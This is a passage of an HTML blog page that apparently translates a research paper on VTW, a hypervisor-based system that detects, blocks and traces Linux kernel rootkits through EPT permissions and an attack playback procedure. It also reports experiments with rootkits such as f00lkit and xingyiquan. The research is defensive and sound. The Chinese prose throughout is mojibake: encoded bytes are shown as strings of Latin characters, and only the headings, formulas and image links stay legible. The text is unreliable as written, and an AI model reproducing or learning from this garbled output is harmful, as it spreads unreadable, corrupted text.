æ®µçš„åœ°å€èŒƒå›´ï¼Œæ¥ä¸‹æ¥å…¶è®¡ç®—æœ€åä¸€çº§å¯ä»¥æŸ¥æ‰¾æ•´ä¸ª LKM ä»£ç åœ°å€èŒƒå›´çš„é¡µè¡¨ï¼ˆ$last_page_table$ï¼‰ã€‚åœ¨å…¶ä¸Šå±‚é¡µè¡¨ä¿å­˜äº† $last_page_table$ åœ°å€çš„é¡µè¡¨å…¥å£ ï¼ˆ$orig_item$ ï¼‰å°†ä¼šè¢«è®°å½•ã€‚</p><p>åœ¨è¿™ä¹‹åï¼ŒVTW åˆ›å»ºä¸€ä¸ªæ–°çš„é¡µè¡¨ ï¼ˆ$new_last_page_table$ï¼‰ å¹¶é€šè¿‡ EPT å°†å…¶è®¾ä¸º â€œä¸å¯å†™â€ã€‚å…¶ä¼šä½¿ç”¨ $new_last_page_table$ çš„åœ°å€è¦†å†™ $orig_item$ã€‚æ¥ä¸‹æ¥ VTW å°† $last_page_table$ çš„æ‰€æœ‰å†…å®¹æ‹·è´åˆ° $new_last_page_table$ ä¸­ã€‚ä¸æ­¤åŒæ—¶å…¶ä¼šä¸ºæ¯ä¸ªç›®æ ‡ LKM åˆ›å»ºä¸€ä»½å†…å­˜é¡µå¹¶é€šè¿‡ EPT å°†å…¶è®¾ä¸º â€œä¸å¯æ‰§è¡Œâ€ï¼Œè¯¥å†…å­˜é¡µè¢«ç§°ä¹‹ä¸º $fake_code$ï¼Œå…¶åœ°å€åˆ™ä¸º $fake_mem$ã€‚</p><p>æœ€åï¼Œ LKM çš„ä»£ç æ®µ åœ¨ $new_last_page_table$ ä¸­å¯¹åº”çš„çš„æ‰€æœ‰æ¡ç›®éƒ½è¢«å¡«å……ä¸º $fake_mem$ï¼Œè‹¥æˆ‘ä»¬å°è¯•æ‰“å¼€ LKM çš„æ‰§è¡Œï¼Œåˆ™ $orig_item$ å°†è¢«ç”¨ $fake_mem$ é‡å†™ã€‚ç”±æ­¤ï¼Œæ§åˆ¶æµå°†ä¼šè¢«é‡å®šå‘åˆ° $fake_code$ ä¸Šã€‚ EPT å¼‚å¸¸åœ°å€ï¼ˆ$fake_item$ï¼‰å°†è¯´æ˜å“ªä¸€ä¸ª LKM å°†è¦è¢«æ‰§è¡Œã€‚</p><p>åœ¨ LKM æ‰§è¡Œä¸­ï¼Œç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œçš„ LKM ç§°ä¹‹ä¸ºç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå‘å‡ºäº†æ¨¡å—é—´è°ƒç”¨è¯·æ±‚çš„ LKM è¢«ç§°ä¸ºæ´»åŠ¨æ¨¡å—ï¼Œè¢«è°ƒç”¨çš„ LKM è¢«ç§°ä¸ºè¢«è°ƒç”¨æ¨¡å—ã€‚</p><p>åœ¨ç¬¬ä¸€ä¸ª LKM è¢«æ‰§è¡Œå‰ï¼ŒVTW è¯»å–è°ƒç”¨å‡½æ•°å‚¨å­˜åœ¨å†…æ ¸æ ˆä¸Šçš„è¿”å›åœ°å€å¹¶åœ¨æ­¤å¤„è®¾ç½®ä¸€ä¸ªæ‰§è¡Œæ–­ç‚¹ï¼Œæ¥ä¸‹æ¥ VTW å¯ç”¨ LKM çš„æ‰§è¡Œæƒé™ã€‚å½“æ§åˆ¶æµåœ¨ LKMs ä¹‹é—´åˆ‡æ¢æ—¶ï¼Œæˆ‘ä»¬è¿½è¸ªæ§åˆ¶æµæµè¿‡çš„æ‰€æœ‰ LKMsã€‚è¿½è¸ªæ–¹æ¡ˆå¦‚ä¸‹æ‰€ç¤ºã€‚</p><h2 id="6-2-Forward-Versus-Backward-of-Rootkit-Attack"><a href="#6-2-Forward-Versus-Backward-of-Rootkit-Attack" class="headerlink" title="6.2 Forward Versus Backward of Rootkit Attack"></a>6.2 Forward Versus Backward of Rootkit Attack</h2><p>rootkits æ”»å‡»åœ¨å¦‚ä¸‹æ‰€ç¤ºçš„ 11 ä¸ªæ­¥éª¤çš„å‰å‘ä¸åå‘é˜¶æ®µä¸­è¢«å®æ–½ã€‚è¯¥æ–¹æ³•ç”¨ä»¥ç›‘æ§ LKM æ§åˆ¶æµçš„è·³è½¬ä¸è¿”å›ã€‚æ­¥éª¤ 1 ~ 6 ç›‘æ§è·³è½¬ï¼Œæ­¥éª¤ 7 ~ 11ç›‘æ§è¿”å›è¿‡ç¨‹ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/XmxawZS56dG38kT.png" alt="image.png"></p><p>ç”±äºå¯¹ LKM çš„æƒé™è®¾ç½®ï¼Œåœ¨è¯¥è¿‡ç¨‹ä¸­ä»»ä½•åœ¨ LKMsï¼ˆ$ConFlowTrans$ï¼‰é—´çš„æ§åˆ¶æµçš„è·³è½¬éƒ½å°†è§¦å‘æ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ ï¼ˆæ­¥éª¤ 1ï¼‰ã€‚VTW é€šè¿‡æ‰€æµè¿‡çš„æ§åˆ¶æµè®°å½•æ¯ä¸€ä¸ª LKM ï¼ˆæ­¥éª¤ 2ï¼‰ï¼Œå¹¶æ£€æŸ¥æ¯ä¸ªè·³è½¬çš„å†…æ ¸æ•°æ®çš„åˆæ³•æ€§ã€‚è‹¥æ•°æ®åˆæ³•ï¼ˆæ­¥éª¤ 3ï¼‰ï¼ŒVTW å°†å¼€å¯è¢«è°ƒç”¨æ¨¡å—çš„æ‰§è¡Œæƒé™ï¼ˆ$TurnOffExe$ï¼‰å¹¶å…³é—­æ´»è·ƒ LKM çš„æ‰§è¡Œæƒé™ ï¼ˆ$TurnOnExe$ï¼Œæ­¥éª¤ 4ï¼‰ã€‚å¦åˆ™ï¼ŒVTW é€šè¿‡å‡½æ•° $HandleException$ å¤„ç†éæ³•çš„ LKMï¼ˆæ­¥éª¤ 5 ~ 6ï¼‰ï¼Œå¹¶å¤„ç†åŒ…æ‹¬æ•°æ®æ¢å¤ï¼ˆ$RecoverData$ï¼‰ä¸ #GP æ³¨å…¥ï¼ˆ$InjectGP$ï¼‰çš„æ“ä½œã€‚</p><p>å½“ LKM çš„æ§åˆ¶æµè¿”å›æ—¶ï¼ˆ$ControlFlowRet$ï¼‰ï¼ŒVTW è·Ÿè¸ªè¿”å›åŠ¨ä½œï¼ˆæ­¥éª¤ 7 ~ 11ï¼‰ï¼Œå½“è¿”å›åˆ°è®¾ç½®åœ¨ç¬¬ä¸€ä¸ª LKM çš„è¿”å›åœ°å€çš„æ–­ç‚¹æ—¶ï¼Œæ„å‘³ç€å½“å‰çš„æ‰§è¡Œå®Œæˆäº†ã€‚</p><p>å½“æ´»åŠ¨çš„ LKM æäº¤äº†ä¸€ä¸ªåœ¨ LKMs é—´çš„è°ƒç”¨è¯·æ±‚æˆ–æ˜¯æ§åˆ¶æµè¿”å›åˆ°ä¹‹å‰çš„ LKMï¼ŒVTW å°†æ£€æµ‹æ˜¯å¦å½“å‰çš„å†…æ ¸æ•°æ®å·²ç»è¢«æ´»åŠ¨çš„ LKM ç¯¡æ”¹äº†ã€‚å¯¹äºåŠ¨æ€å†…æ ¸æ•°æ®ï¼ŒVTW ä½¿ç”¨ â€œRootkit æ”»å‡»æ£€æµ‹â€ æ–¹æ³•è¿›è¡Œæ£€æµ‹ã€‚</p><p>å¯¹äºæœ‰ç€å†™ä¿æŠ¤çš„é™æ€å†…æ ¸æ•°æ®ï¼Œä»»ä½•çš„ç¯¡æ”¹éƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ï¼Œä¹‹å VTW å°†æ“ä½œç³»ç»Ÿè®¾ç½®åˆ°å•æ­¥è°ƒè¯•å¹¶å¯ç”¨å¯¹å†…æ ¸æ•°æ®çš„å†™æƒé™ã€‚ç”±æ­¤ï¼Œåœ¨ LKM å®Œæˆå¯¹é™æ€å†…æ ¸æ•°æ®çš„ç¯¡æ”¹åï¼Œå…¶ä¼šå†æ¬¡é™·å…¥åˆ° â€œhostâ€ã€‚æœ€å VTW è¯»å–è¢«ç¯¡æ”¹çš„æ•°æ®å¹¶ä½¿ç”¨å¤‡ä»½æ•°æ®ä¸­çš„åˆå§‹å€¼è¿›è¡Œæ¢å¤ã€‚</p><p>é€šè¿‡ä¸Šè¿°æ“ä½œï¼ŒVTW å¯ä»¥è·å¾—ç¯¡æ”¹çš„æ•°æ®ï¼Œå°†ç¯¡æ”¹çš„æ•°æ®ä¸æ‰€æœ‰ LKMs çš„ä»£ç æ®µèŒƒå›´è¿›è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥é‡å®šå‘æ§åˆ¶æµæ‰€å±çš„ LKMã€‚</p><p>è‹¥æ£€æµ‹åˆ°å†…æ ¸æ•°æ®è¢«ç¯¡æ”¹äº†ï¼Œå½“å‰è¿è¡Œçš„å†…æ ¸æ¨¡å—å°†è¢«è®¤ä¸ºæ˜¯æ”»å‡»çš„è¡Œä¸ºè½½ä½“ï¼Œç¬¬ä¸€ä¸ªæ¨¡å—å°†æˆä¸ºåŠ¨ä½œè½½ä½“ï¼Œé‡å®šå‘æ§åˆ¶æµæ‰€å±çš„æ¨¡å—åˆ™æˆä¸ºå‡½æ•°è½½ä½“ã€‚</p><p>å…¶ä»–çš„ LKMs å°†æˆä¸ºè¿‡ç¨‹è½½ä½“ã€‚ä¸ºäº†é¢„é˜²æ›´å¤šçš„ä¼¤å®³ï¼ŒVTW å‘å½“å‰æ§åˆ¶æµæ³¨å…¥ä¸€ä¸ªé€šç”¨ä¿æŠ¤å¼‚å¸¸ã€‚æœ€åï¼Œè¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®å°†è¢«å¤åŸï¼Œå½“å‰çš„æœ‰å®³æ“ä½œå°†è¢«ç»ˆæ­¢ã€‚</p><h2 id="6-3-Task-Switching-in-Multicore-Execution"><a href="#6-3-Task-Switching-in-Multicore-Execution" class="headerlink" title="6.3 Task Switching in Multicore Execution"></a>6.3 Task Switching in Multicore Execution</h2><p>å½“ LKM æ‰§è¡Œæ—¶å‘ç”Ÿäº†ä»»åŠ¡åˆ‡æ¢ï¼ŒLKM çš„ CPU èµ„æºå°†è¢«æ”¶å›ã€‚è‹¥ LKM ä¸å†è¢«è°ƒåº¦ï¼Œå…¶å°†æ°¸è¿œä¸ä¼šäº§ç”Ÿæ¨¡å—é—´è°ƒç”¨è¯·æ±‚ï¼Œæˆ‘ä»¬åœ¨è¿”å›åœ°å€è®¾ç½®çš„æ‰§è¡Œæ–­ç‚¹å°†æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚ç”±äºç¼ºä¹è§¦å‘æ¡ä»¶ï¼ŒVTW å°†åœ¨æœ€åä¸€æ¬¡æ£€æµ‹åå¿½ç•¥æ‰ LKM åœ¨å†…æ ¸ä¸Šçš„å½±å“ã€‚</p><p>ä¸åŒçš„ LKMs å¯èƒ½è¢«åœ¨å¤šä¸ªæ ¸å¿ƒä¸Šå¹¶è¡Œæ‰§è¡Œï¼Œè¿™å¯èƒ½å½±å“å¯¹è¡Œä¸ºè½½ä½“çš„è¯†åˆ«ï¼Œä¾‹å¦‚ä¸¤ä¸ª LKMs å¯èƒ½åŒæ—¶åœ¨ä¸åŒçš„ CPU æ ¸å¿ƒä¸­è¿è¡Œã€‚è‹¥åŠ¨æ€å†…æ ¸å¯¹è±¡è¢«æ£€æµ‹åˆ°åœ¨å…¶è¿è¡Œæ—¶è¢«ç¯¡æ”¹ï¼Œæˆ‘ä»¬æ— æ³•ç®—å‡ºè¿™ä¸¤ä¸ª LKMs ä¸­çš„å“ªä¸€ä¸ªè¿›è¡Œäº†æœ‰å®³æ“ä½œã€‚</p><p>ä¸ºäº†ç¡®ä¿ç²¾ç¡®çš„å¯è¿½è¸ªæ€§ï¼ŒVTW å¼•å…¥ä¸€ä¸ªåŠ¨ä½œå›æ”¾æ–¹æ³•ï¼Œåœ¨ â€œæ”»å‡»å›æ”¾ç¨‹åºâ€ï¼ˆAttack Playback Procedureï¼‰ä¸­å±•ç¤ºã€‚å½“ä¸€ä¸ª LKM è¢«è°ƒåº¦ä»¥æ‰§è¡Œä¸”åœ¨å…¶ä»–æ ¸å¿ƒä¸Šæœ‰ä¸€ä¸ªæˆ–æ›´å¤š LKMs æ­£åœ¨è¢«æ‰§è¡Œï¼Œåˆ™è¯¥æ–¹æ³•ä¼šè¢«å¯åŠ¨ã€‚</p><h2 id="6-4-Attack-Playback-Procedure"><a href="#6-4-Attack-Playback-Procedure" class="headerlink" title="6.4 Attack Playback Procedure"></a>6.4 Attack Playback Procedure</h2><p>å½“å¤šä¸ª LKMs åŒæ—¶è·‘åœ¨å¤šä¸ªæ ¸å¿ƒä¸Šæ—¶ï¼Œè¯¥æ–¹æ³•ç”¨ä»¥è¾¨åˆ«å“ªä¸€ä¸ª LKM ä¸ºå†…æ ¸ rootkitã€‚æ”»å‡»å›æ”¾ç¨‹åºå¦‚ä¸‹æ‰€ç¤ºï¼Œæ­¥éª¤ 1 ~ 5 ä¸ºæ‰€éœ€å†…å®¹ï¼Œæ­¥éª¤ 6 ~ 9 è¿›è¡Œå›æ”¾ã€‚å½“ LKM $\mathscr{L}j$ è¢«è½½å…¥åœ¨ä¸€ä¸ªæ ¸å¿ƒä¸Šè¿è¡Œæ—¶ï¼ˆ$LoadOnCore$ï¼‰ï¼Œè¯¥æ‰§è¡Œå¿…é¡»è§¦å‘æ“ä½œç³»ç»Ÿé™·å…¥åˆ° host æ¨¡å¼ï¼ˆâ€œæ”»å‡»å›æ”¾ç¨‹åºâ€ ä¸­çš„ æ­¥éª¤ 1ï¼‰ã€‚åœ¨è¿™ä¹‹åï¼Œ $\mathscr{L}j$ å°†è¢«è®°å½•åˆ°å…ƒç»„ $\mathscr{F}$ ä¸­ï¼ˆæ­¥éª¤ 2ï¼‰ã€‚</p><p>VTW é¦–å…ˆé€šè¿‡å‡½æ•° $CheckKernel$ æ£€æŸ¥å½“å‰çš„å†…æ ¸æ•°æ®å®Œæ•´æ€§æ˜¯å¦è¢«ç ´åï¼Œè‹¥æœªè¢«ç ´åï¼ˆæ­¥éª¤ 3ï¼‰ï¼Œå…¶ä¼šæ‹·è´å½“å‰çš„ CPU ä¸Šä¸‹æ–‡ä¿¡æ¯ã€å†…æ ¸æ ˆã€LKM ä»£ç æ®µï¼ˆæ‰€æœ‰è¿™äº›ç§°ä½œå›æ”¾ä¸Šä¸‹æ–‡ï¼‰ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/4qFEaxVPRTUcJCb.png" alt="image.png"></p><p>è‹¥æœ‰å¤šäºä¸€ä¸ª LKM è¿è¡Œåœ¨ä¸åŒçš„ CPU æ ¸å¿ƒä¸Šï¼Œæ‰€æœ‰è¿è¡Œä¸­çš„ LKMs éƒ½å·²è¢«å¤‡ä»½ï¼Œç”±æ­¤æˆ‘ä»¬åªéœ€è¦å¤‡ä»½è¦è¢«æ‰§è¡Œçš„ LKMï¼ˆæ­¥éª¤ 4 ï¼‰ã€‚è‹¥ä»…æœ‰ä¸€ä¸ªè¿è¡Œä¸­çš„ LKMï¼Œæ­£åœ¨è¢«æ‰§è¡Œçš„ LKM ä¸å°†è¦è¢«æ‰§è¡Œçš„ LKM éƒ½éœ€è¦è¦è¢«å¤‡ä»½ï¼ˆæ­¥éª¤ 5ï¼‰ã€‚åœ¨å®Œæˆå¤‡ä»½åï¼ŒVTW å°†æ“ä½œç³»ç»Ÿå†æ¬¡åˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ä»¥ç»§ç»­è¿è¡Œã€‚</p><p>ä¸ºäº†ç®—å‡ºå“ªä¸€ä¸ª LKM ä¸ºå†…æ ¸ rootkitï¼Œæ‰€æœ‰çš„åŠ¨ä½œéƒ½ä¼šè¢«é€šè¿‡ $ForEach$ ä¸ $ExeBack$ å‡½æ•°ä¸ºæ‰€æœ‰åœ¨å…¶ä»–æ ¸å¿ƒä¸Šè¿è¡Œçš„ LKMs é€ä¸€è¿›è¡Œå›æ”¾ã€‚å›æ”¾æ­¥éª¤å¦‚ å›¾.6 æ‰€ç¤ºï¼Œå›æ”¾è¿‡ç¨‹ä¸ºå¦‚ä¸‹æ‰€ç¤ºçš„äº”ä¸ªæ­¥éª¤ï¼š</p><p>1ï¼‰ ä½¿ç”¨ä¹‹å‰å¤‡ä»½çš„å†…å®¹é‡å†™å½“å‰å†…æ ¸æ ˆä¸ LKM çš„æ•°æ®ã€‚</p><p>2ï¼‰ ä½¿ç”¨å¤‡ä»½çš„ CPU ä¸Šä¸‹æ–‡å¡«å…… VMCS çš„ â€œguest filedâ€ å¹¶æ¢å¤è¢«ç ´åçš„å†…æ ¸æ•°æ®ã€‚</p><p>3ï¼‰ å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢åˆ° â€œguestâ€ æ¨¡å¼ä»¥å¼€å§‹ LKM æ‰§è¡Œã€‚</p><p>4ï¼‰ åœ¨å†…æ ¸æ•°æ®è¢«æ‘§æ¯çš„æŒ‡ä»¤ä½ç½®åœæ­¢æ‰§è¡Œã€‚</p><p>5ï¼‰æ£€æµ‹æ˜¯å¦ä¸€ä¸ªè¢«ç ´åçš„æ•°æ®å°†è§¦å‘äºŒæ¬¡ç ´åã€‚å½“å‰çš„ LKM ä¸ºè¡Œä¸ºè½½ä½“ã€‚è‹¥è¯¥å†…æ ¸æ•°æ®ä¿æŒå®Œæ•´ï¼Œåˆ™åˆ‡æ¢åˆ°æ­¥éª¤ ï¼ˆ1ï¼‰ æ¢å¤å›æ”¾ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/iagyB7kZt3jJnWT.png" alt="å›¾.6 è·Ÿè¸ªä¸€ä¸ª Linux æœåŠ¡å™¨ä¸Šä¸¤ä¸ªæ‰§è¡Œæ ¸å¿ƒé—´çš„ä»»åŠ¡åˆ‡æ¢"></p><p>é€šè¿‡è¯¥æ–¹æ³•ï¼Œæ¯ä¸ª LKM éƒ½å°†ä¼šä»å†…æ ¸æ•°æ®æœªè¢«æ‘§æ¯çš„ä½ç½®å¼€å§‹æ‰§è¡Œï¼Œå¹¶åœæ­¢åœ¨å†…æ ¸æ•°æ®è¢«æ‘§æ¯çš„ä½ç½®ã€‚è‹¥è¢«å›æ”¾çš„ LKM ç ´åäº†å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ï¼Œå…¶å°†è¢«è¯†åˆ«ä¸º rootkitï¼ˆæ­¥éª¤ 9ï¼‰ã€‚</p><p>åœ¨è¿½è¸ªå®Œæˆä¹‹åï¼ŒVTW å°†ä¸ºå‰©ä½™çš„ LKMs æ¢å¤æ‰§è¡Œï¼Œå¹¶è®©ä»–ä»¬ä»å†…æ ¸æ•°æ®å®Œæ•´æ€§è¢«ç ´åçš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p><p>åœ¨åŠ¨ä½œå›æ”¾è¿‡ç¨‹ä¸­ï¼Œè¢«æ¢å¤çš„å†…æ ¸æ•°æ®åŒ…æ‹¬è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®ä¸å›æ”¾ä¸Šä¸‹æ–‡ï¼Œå¯¹å‰è€…çš„æ¢å¤å°†ç»´æŒå†…æ ¸çš„å®Œæ•´æ€§ï¼Œåè€…åˆ™ä»…ä¸è¢«å›æ”¾çš„ LKM ç›¸å…³ã€‚ç”±æ­¤ï¼Œè¢«æ¢å¤çš„å†…æ ¸æ•°æ®å¹¶ä¸ä¼šå½±å“å…¶ä»– LKMs çš„æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬åˆ†æäº† 23 ä¸ªå†…æ ¸ rootkits å¹¶å‘ç°é™¤äº†å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–ï¼Œä»–ä»¬ä¸ä¼šä¿®æ”¹å…¶ä»–å†…æ ¸æ•°æ®ã€‚åœ¨å¯¹ 72 ä¸ªåœ¨ Linux ä¸­è¢«é¢‘ç¹ä½¿ç”¨çš„æ™®é€š LKMs ï¼ˆä¾‹å¦‚ $nf_nat,ib_cm,snd_seg$ ç­‰ï¼‰çš„ç›‘æ§è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘ä»¬å‘ç°æ™®é€šçš„ LKMs å°†ä¸ä¼šä¿®æ”¹è¢«ä¿æŠ¤çš„å†…æ ¸æ•°æ®ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹åœ¨å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–çš„ä»»ä½•ä¸œè¥¿ã€‚</p><p>ç”±æ­¤ï¼Œåœ¨è¿›è¡ŒåŠ¨ä½œå›æ”¾æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦æ¢å¤é™¤äº†è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®ä¸å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–çš„å†…æ ¸æ•°æ®ï¼Œè¿™å¹¶ä¸ä¼šå½±å“å…¶ä»– LKMs çš„æ­£ç¡®æ€§ã€‚</p><h1 id="7-Experiments-And-Performance-Analysis"><a href="#7-Experiments-And-Performance-Analysis" class="headerlink" title="7 Experiments And Performance Analysis"></a>7 Experiments And Performance Analysis</h1><p>æˆ‘ä»¬ä½¿ç”¨å‡ ä¸ªå†…æ ¸ rootkit ä¸åŸºå‡†æµ‹è¯•æ¥æµ‹è¯• VTw çš„é˜²æŠ¤æ•ˆæœä¸è¿è¡Œæ•ˆç‡ã€‚</p><h2 id="7-1-Experimental-Environment"><a href="#7-1-Experimental-Environment" class="headerlink" title="7.1 Experimental Environment"></a>7.1 Experimental Environment</h2><p>å®éªŒä¸­çš„ç‰©ç† host ä¸ºä¸€ä¸ªæœ‰ä¸€é¢— Intel i3-9100 @ 3.6 GHZ 4æ ¸å¿ƒå¤„ç†å™¨ã€8Gå†…å­˜ã€256Gç¡¬ç›˜çš„ HP æ¡Œé¢ç”µè„‘ã€‚ä¸åŒ rootkit çš„å®‰è£…ç¯å¢ƒæ˜¯éå¸¸ä¸åŒçš„ï¼Œä¸ºäº†å®‰è£… rootkit $f00lkit$ï¼Œæˆ‘ä»¬ä½¿ç”¨ Ubuntu 12.04 ä¸å†…æ ¸ 3.2.16 ä½œä¸ºè¢«æµ‹è¯•æ“ä½œç³»ç»Ÿã€‚</p><h2 id="7-2-Rootkit-Detection-Defence-and-Traceability"><a href="#7-2-Rootkit-Detection-Defence-and-Traceability" class="headerlink" title="7.2 Rootkit Detection, Defence, and Traceability"></a>7.2 Rootkit Detection, Defence, and Traceability</h2><p>$f00lkit$ é€šè¿‡ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ¥éšè—ç›®æ ‡å¯¹è±¡ï¼Œå…¶å°†æ§åˆ¶æµé‡å®šå‘åˆ°å…¶è‡ªå·±çš„ä»£ç æ®µä¸Šã€‚VTW åœ¨ $f00lkit$ ä¸Šçš„æ£€æµ‹æ•ˆæœå¦‚ å›¾.7 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/4G8tqF7iSLXAjOv.png" alt="å›¾.7 å¯¹ä¸€ä¸ªå…¸å‹è¢«æ£€æµ‹çš„ rootkit æ”»å‡»ï¼ˆf00lkitï¼‰çš„è¿‡ç¨‹çš„è™šæ‹ŸåŒ–"></p><p>ä¸Šã€ä¸­ã€ä¸‹ä¸‰ä¸ªçª—å£åˆ†åˆ«ä¸ºåœ¨ VTW è½½å…¥ä¹‹å‰å¯¹æ“ä½œç³»ç»Ÿçš„å…¥ä¾µè¡¨ç°ã€åœ¨ VTW è½½å…¥åå¯¹æ“ä½œç³»ç»Ÿçš„å…¥ä¾µè¡¨ç°ã€VTW çš„é˜²æŠ¤ç»“æœã€‚åœ¨ä¸Šé¢çš„çª—å£ä¸­ï¼Œæˆ‘ä»¬å‘ç° $f00lkit$ å¯ä»¥éšè—ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶ï¼Œå¦‚ç¬¬äºŒè¡Œæ‰€ç¤ºã€‚</p><p>ä¸­é—´çš„çª—å£æ˜¾ç¤ºäº†åœ¨ VTW è½½å…¥å $f00lkit$ ä¸å†å¯¹ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶æœ‰ç€éšè—çš„æ•ˆæœï¼Œå½“ $f00lkit$ å°è¯•ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ—¶ï¼ŒVTW æ£€æµ‹åˆ°äº†å…¶æ„å›¾å¹¶ç”Ÿæˆä¸€ä¸ª â€œEPT violationâ€ï¼Œä¹‹å VTW å°†ä¸€ä¸ª #GP æäº¤åˆ° â€œguestâ€ è¿›è¡Œé¢„é˜²ã€‚</p><p>ä¸ºäº†æµ‹è¯• VTW çš„å¯è¿½è¸ªæ€§ï¼Œæˆ‘ä»¬é‡å†™äº† rootkits $f00lkit$ ä¸ $xingyiquan$ ï¼Œå¹¶å¼•å…¥äº†ä¸¤ä¸ªè¾…åŠ©çš„ LKMs $jmp_lkm$ ä¸ $action_lkm$ ï¼Œåœ¨æˆ‘ä»¬è®¾ç½®çš„æ”»å‡»åœºæ™¯ä¸­ï¼Œ$f00lkit$ å¹¶ä¸ä¼šæ‘§æ¯å†…æ ¸æ•°æ®ï¼Œå…¶æœ‰ä¸€ä¸ªç”¨äºæ›¿æ¢ç³»ç»Ÿå‡½æ•°ä»¥éšè—ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶çš„å¯¼å‡ºå‡½æ•° $func_1$ã€‚</p><p>åœ¨è¾…åŠ© LKM $action_lkm$ ä¸­è¿˜æœ‰ä¸€ä¸ªå¯¼å‡ºå‡½æ•° $func_2$ ã€‚å½“ $func_2$ è¢«æ‰§è¡Œæ—¶ï¼Œå…¶ä¼šç¯¡æ”¹å†…æ ¸æ•°æ®å¹¶å°†ç³»ç»Ÿæ§åˆ¶æµé‡å®šå‘åˆ°  $func_1$ ã€‚åœ¨è¾…åŠ© LKM $jmp_lkm$ ä¸­çš„å¯¼å‡ºå‡½æ•°ä¸º  $func_3$ ï¼Œåœ¨  $func_2$ æ‰§è¡Œè¿‡ç¨‹ä¸­  $func_3$ ä¼šè¢«è°ƒç”¨ã€‚</p><p>ä¸Šè¿°ä¸‰ä¸ªå¯¼å‡ºå‡½æ•°ç›´åˆ°è¢«å…¶ä»– LKMs è°ƒç”¨æ—¶æ‰ä¼šè¢«æ‰§è¡Œã€‚å½“ $xingyiquan$ æ‰§è¡Œæ—¶ï¼Œ $func_3$ è¢« $xingyiquan$ è°ƒç”¨ï¼Œæœ€åå†…æ ¸å‡½æ•°è¢«é€šè¿‡  $func_2$  é‡å®šå‘è‡³ $f00lkit$ã€‚</p><p>LKM $action_lkm$ ç›´æ¥ç¯¡æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œå…¶ä¸ºä¸€ä¸ªè¡Œä¸ºè½½ä½“ã€‚åŸæœ‰çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°è¢« $f00lkit$ ä¸­çš„å‡½æ•°æ‰€æ›¿ï¼Œç”±æ­¤ï¼ŒVTWè®¤å®š $f00lkit$ ä¸ºä¸€ä¸ªå‡½æ•°è½½ä½“ã€‚è¯¥æ¬¡æ”»å‡»çš„ç¬¬ä¸€ä¸ªå‘èµ·è€…ä¸º $xingyiquan$ï¼Œå…¶é€šè¿‡ $lkm_jmp$ ä½¿å¾—æ§åˆ¶æµè·³è½¬åˆ°å…¶ä»–æ¨¡å—ï¼Œç”±æ­¤ $xingyiquan$ è¢«ç¡®å®šä¸ºåŠ¨ä½œè½½ä½“ï¼Œ$jmp_lkm$ è¢«ç¡®å®šä¸ºè¿‡ç¨‹è½½ä½“ã€‚</p><p>VTW æ£€æµ‹ã€é˜²å¾¡ã€è¿½è¸ªåŒ…æ‹¬ $adore$-$ngã€kbeastã€wnpsã€brootusã€diamorphineã€z$-$rootkitã€suterusu$ ç­‰åœ¨å†…çš„å†…æ ¸ rootkitsã€‚VTW é€šè¿‡ EPT é¡µè¡¨ä¸ºå¦‚ç³»ç»Ÿè°ƒç”¨è¡¨çš„å†…æ ¸å¯¹è±¡è®¾ç½®å†™ä¿æŠ¤ï¼Œç”±æ­¤ï¼Œä»»ä½•å†™æ“ä½œéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿä» â€œguestâ€ æ¨¡å¼é™·å…¥åˆ° â€œhostâ€ æ¨¡å¼ã€‚</p><p>ä¹‹å VTW ä½¿ç”¨ #GP å¼‚å¸¸æ¥é˜²æ­¢éæ³•æ“ä½œã€‚å†…æ ¸ rootkits çš„æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹éƒ½è¢« VTW æ‰€ç›‘æ§ã€‚é€šè¿‡æ“æ§ LKMs çš„æ‰§è¡Œæƒé™ï¼ŒVTW å¯ä»¥å¤ºå–æ¯ä¸ª LKM çš„æ‰§è¡Œã€‚ç”±æ­¤ï¼ŒLKM çš„è°ƒç”¨ã€è·³è½¬ã€è¿”å›éƒ½è¢«åŒæ­¥è®°å½•ã€‚</p><h2 id="7-3-Performance-Evaluation"><a href="#7-3-Performance-Evaluation" class="headerlink" title="7.3 Performance Evaluation"></a>7.3 Performance Evaluation</h2><p>åœ¨æœ¬èŠ‚ä¸­ï¼Œ VTW åœ¨ CPU ä¸Šçš„æ‰§è¡Œå¼€é”€å°†è¢«ä½¿ç”¨ $nbench$ æµ‹é‡ï¼Œå¯¹ç³»ç»Ÿå»¶è¿Ÿä¸å¸¦å®½çš„å½±å“å°†è¢« Lmbench æµ‹é‡ï¼Œå¯¹ I&#x2F;O çš„å½±å“å°†è¢« IOMeter 